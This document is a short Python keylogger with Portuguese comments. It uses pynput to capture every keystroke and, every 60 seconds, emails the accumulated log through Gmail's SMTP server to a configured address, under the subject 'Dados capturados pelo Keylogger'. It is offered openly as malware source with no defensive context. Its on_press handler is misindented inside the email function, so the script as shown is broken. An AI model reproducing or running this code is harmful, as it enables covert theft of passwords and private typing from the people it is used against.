from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#configurações de email
EMAIL_ORIGEM = "" # seu email de origem
EMAIL_DESTINO = ""  # email de destino
SENHA_EMAIL = ""  # senha do email de origem

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar", e)
    
        log = ""

    # Agendar o próximo envio em 1 minuto
    Timer(60, enviar_email).start()

    def on_press(key):
        global log
        try:
            log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.backspace:
                log += "[<] "
            else:
                pass # Ignorar control, shift, etc...

# Inicia o keylogger eo envio automático de email
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
